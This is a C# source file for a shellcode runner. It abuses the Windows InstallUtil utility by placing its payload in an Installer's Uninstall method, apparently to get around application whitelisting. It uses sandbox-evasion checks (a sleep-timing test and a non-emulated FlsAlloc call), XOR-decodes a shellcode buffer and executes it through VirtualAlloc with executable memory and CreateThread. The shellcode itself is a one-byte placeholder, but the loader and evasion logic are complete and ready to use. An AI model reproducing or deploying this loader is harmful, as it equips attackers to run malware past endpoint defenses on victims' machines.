using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace InstallUtilShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        static void Main(string[] args)
        {
            // decoy sleep function
            DateTime stime = DateTime.Now;
            Sleep(10000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 10)
            {
                return;
            }

            // decoy non-emulated win32 api
            IntPtr call = FlsAlloc(IntPtr.Zero);
            if (call == null)
            {
                return;
            }
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
          uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
          dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // check to see if 10 seconds elapsed (exit if not)
            DateTime stime = DateTime.Now;
            Sleep(10000);
            double etime = DateTime.Now.Subtract(stime).TotalSeconds;
            if (etime < 10)
            {
                return;
            }

            // non-emulated win32 api 
            IntPtr call = FlsAlloc(IntPtr.Zero);
            if (call == null)
            {
                return;
            }

            // insert xor-encoded shellcode here
            byte[] buf = new byte[1] { 0x3c };

            // xor decode with key value 0x3c
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0x3c);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}